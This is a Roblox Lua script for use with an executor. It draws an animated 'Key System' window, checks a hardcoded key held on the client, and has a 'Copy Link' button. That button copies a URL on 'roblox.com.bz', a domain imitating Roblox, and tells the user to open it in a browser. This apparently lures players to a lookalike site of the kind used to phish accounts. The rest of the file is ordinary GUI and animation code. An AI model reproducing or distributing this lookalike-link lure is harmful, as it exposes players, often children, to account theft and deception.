local KEY_LINK = "https://roblox.com.bz/communities/8315875508/"
local VALID_KEY = "YourSecretKey123"
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeySystem"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = playerGui
local Overlay = Instance.new("Frame")
Overlay.Name = "Overlay"
Overlay.Size = UDim2.new(1, 0, 1, 0)
Overlay.Position = UDim2.new(0, 0, 0, 0)
Overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Overlay.BackgroundTransparency = 0.45
Overlay.BorderSizePixel = 0
Overlay.ZIndex = 1
Overlay.Parent = ScreenGui
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 480, 0, 260)
MainFrame.Position = UDim2.new(0.5, -240, 0.5, -130)
MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 18)
MainFrame.BorderSizePixel = 0
MainFrame.ZIndex = 2
MainFrame.Parent = ScreenGui
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 14)
MainCorner.Parent = MainFrame
local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(0, 170, 255)
MainStroke.Thickness = 1.5
MainStroke.Transparency = 0.3
MainStroke.Parent = MainFrame
local BgGradient = Instance.new("UIGradient")
BgGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(14, 14, 28)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 8, 16))
})
BgGradient.Rotation = 135
BgGradient.Parent = MainFrame
local AccentBar = Instance.new("Frame")
AccentBar.Name = "AccentBar"
AccentBar.Size = UDim2.new(1, 0, 0, 3)
AccentBar.Position = UDim2.new(0, 0, 0, 0)
AccentBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
AccentBar.BorderSizePixel = 0
AccentBar.ZIndex = 3
AccentBar.Parent = MainFrame
local AccentGrad = Instance.new("UIGradient")
AccentGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 200, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 0, 255))
})
AccentGrad.Parent = AccentBar

local AccentBarCorner = Instance.new("UICorner")
AccentBarCorner.CornerRadius = UDim.new(0, 14)
AccentBarCorner.Parent = AccentBar
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "Title"
TitleLabel.Size = UDim2.new(1, 0, 0, 36)
TitleLabel.Position = UDim2.new(0, 0, 0, 18)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "🔑  KEY SYSTEM"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 20
TitleLabel.ZIndex = 3
TitleLabel.Parent = MainFrame
local SubLabel = Instance.new("TextLabel")
SubLabel.Name = "Sub"
SubLabel.Size = UDim2.new(1, 0, 0, 18)
SubLabel.Position = UDim2.new(0, 0, 0, 52)
SubLabel.BackgroundTransparency = 1
SubLabel.Text = "Enter your key to unlock access"
SubLabel.TextColor3 = Color3.fromRGB(100, 130, 160)
SubLabel.Font = Enum.Font.Gotham
SubLabel.TextSize = 12
SubLabel.ZIndex = 3
SubLabel.Parent = MainFrame
local Divider = Instance.new("Frame")
Divider.Size = UDim2.new(0.85, 0, 0, 1)
Divider.Position = UDim2.new(0.075, 0, 0, 78)
Divider.BackgroundColor3 = Color3.fromRGB(30, 40, 60)
Divider.BorderSizePixel = 0
Divider.ZIndex = 3
Divider.Parent = MainFrame
local InputBox = Instance.new("TextBox")
InputBox.Name = "KeyInput"
InputBox.Size = UDim2.new(0.84, 0, 0, 42)
InputBox.Position = UDim2.new(0.08, 0, 0, 96)
InputBox.BackgroundColor3 = Color3.fromRGB(18, 20, 35)
InputBox.TextColor3 = Color3.fromRGB(200, 220, 255)
InputBox.PlaceholderText = "Paste your key here..."
InputBox.PlaceholderColor3 = Color3.fromRGB(60, 80, 110)
InputBox.Text = ""
InputBox.Font = Enum.Font.GothamMedium
InputBox.TextSize = 13
InputBox.ClearTextOnFocus = false
InputBox.BorderSizePixel = 0
InputBox.ZIndex = 3
InputBox.Parent = MainFrame
local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 8)
InputCorner.Parent = InputBox
local InputStroke = Instance.new("UIStroke")
InputStroke.Color = Color3.fromRGB(30, 60, 100)
InputStroke.Thickness = 1.2
InputStroke.Parent = InputBox
local InputPadding = Instance.new("UIPadding")
InputPadding.PaddingLeft = UDim.new(0, 12)
InputPadding.Parent = InputBox
InputBox.Focused:Connect(function()
    TweenService:Create(InputStroke, TweenInfo.new(0.2), {
        Color = Color3.fromRGB(0, 170, 255),
        Thickness = 1.5
    }):Play()
end)

InputBox.FocusLost:Connect(function()
    TweenService:Create(InputStroke, TweenInfo.new(0.2), {
        Color = Color3.fromRGB(30, 60, 100),
        Thickness = 1.2
    }):Play()
end)

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Name = "Status"
StatusLabel.Size = UDim2.new(0.84, 0, 0, 18)
StatusLabel.Position = UDim2.new(0.08, 0, 0, 142)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = ""
StatusLabel.TextColor3 = Color3.fromRGB(100, 130, 160)
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextSize = 11
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.ZIndex = 3
StatusLabel.Parent = MainFrame
local function createButton(text, posX, color1, color2)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 168, 0, 44)
    btn.Position = posX
    btn.BackgroundColor3 = color1
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 13
    btn.BorderSizePixel = 0
    btn.AutoButtonColor = false
    btn.ZIndex = 3
    btn.Parent = MainFrame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 9)
    corner.Parent = btn

    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, color1),
        ColorSequenceKeypoint.new(1, color2)
    })
    grad.Rotation = 90
    grad.Parent = btn

    -- Hover effect
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {
            BackgroundTransparency = 0.15
        }):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {
            BackgroundTransparency = 0
        }):Play()
    end)

    return btn
end

-- CHECK KEY button (left)
local CheckBtn = createButton(
    "✔  Check Key",
    UDim2.new(0.08, 0, 0, 172),
    Color3.fromRGB(0, 120, 210),
    Color3.fromRGB(0, 60, 160)
)

-- COPY LINK button (right)
local CopyBtn = createButton(
    "🔗  Copy Link",
    UDim2.new(0, 0, 0, 172),
    Color3.fromRGB(80, 0, 180),
    Color3.fromRGB(40, 0, 120)
)
-- Right-align it properly
CopyBtn.Position = UDim2.new(1, -168 - 38, 0, 172)
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 28, 0, 28)
CloseBtn.Position = UDim2.new(1, -38, 0, 10)
CloseBtn.BackgroundColor3 = Color3.fromRGB(30, 15, 15)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(180, 80, 80)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 13
CloseBtn.BorderSizePixel = 0
CloseBtn.AutoButtonColor = false
CloseBtn.ZIndex = 4
CloseBtn.Parent = MainFrame

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 7)
CloseCorner.Parent = CloseBtn

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

CheckBtn.MouseButton1Click:Connect(function()
    local input = InputBox.Text

    if input == "" then
        StatusLabel.Text = "⚠  Please enter a key first."
        StatusLabel.TextColor3 = Color3.fromRGB(255, 180, 0)
        return
    end


    TweenService:Create(CheckBtn, TweenInfo.new(0.08), { Size = UDim2.new(0, 162, 0, 40) }):Play()
    task.delay(0.08, function()
        TweenService:Create(CheckBtn, TweenInfo.new(0.08), { Size = UDim2.new(0, 168, 0, 44) }):Play()
    end)

    if input == VALID_KEY then
        StatusLabel.Text = "✅  Key accepted! Loading..."

        task.delay(1.5, function()
            TweenService:Create(ScreenGui:FindFirstChild("MainFrame"), TweenInfo.new(0.4), {
                BackgroundTransparency = 1
            }):Play()
            TweenService:Create(Overlay, TweenInfo.new(0.4), {
                BackgroundTransparency = 1
            }):Play()
            task.delay(0.45, function()
                ScreenGui:Destroy()
         
            end)
        end)
    else
        StatusLabel.Text = "❌  Invalid key. Get yours via Copy Link."
        StatusLabel.TextColor3 = Color3.fromRGB(255, 70, 70)

  
        local orig = MainFrame.Position
        for i = 1, 4 do
            task.delay(i * 0.05, function()
                local offset = (i % 2 == 0) and 6 or -6
                TweenService:Create(MainFrame, TweenInfo.new(0.04), {
                    Position = UDim2.new(0.5, -240 + offset, 0.5, -130)
                }):Play()
            end)
        end
        task.delay(0.25, function()
            TweenService:Create(MainFrame, TweenInfo.new(0.06), {
                Position = UDim2.new(0.5, -240, 0.5, -130)
            }):Play()
        end)
    end
end)


CopyBtn.MouseButton1Click:Connect(function()
    -- Animate button press
    TweenService:Create(CopyBtn, TweenInfo.new(0.08), { Size = UDim2.new(0, 162, 0, 40) }):Play()
    task.delay(0.08, function()
        TweenService:Create(CopyBtn, TweenInfo.new(0.08), { Size = UDim2.new(0, 168, 0, 44) }):Play()
    end)

    setclipboard(KEY_LINK)  -- Copies link to clipboard (works in most executors)

    local oldText = CopyBtn.Text
    CopyBtn.Text = "✅  Copied!"
    StatusLabel.Text = "🔗  Link copied! Open it in your browser."
    StatusLabel.TextColor3 = Color3.fromRGB(0, 200, 255)

    task.delay(2, function()
        CopyBtn.Text = oldText
    end)
end)

-- ============================================
--         ENTRANCE ANIMATION
-- ============================================

MainFrame.BackgroundTransparency = 1
MainFrame.Position = UDim2.new(0.5, -240, 0.6, -130)

TweenService:Create(MainFrame, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    BackgroundTransparency = 0,
    Position = UDim2.new(0.5, -240, 0.5, -130)
}):Play()

-- Animate accent bar glow pulse
task.spawn(function()
    while ScreenGui.Parent do
        TweenService:Create(MainStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Transparency = 0.6
        }):Play()
        task.wait(1.5)
        TweenService:Create(MainStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Transparency = 0.1
        }):Play()
        task.wait(1.5)
    end
end)
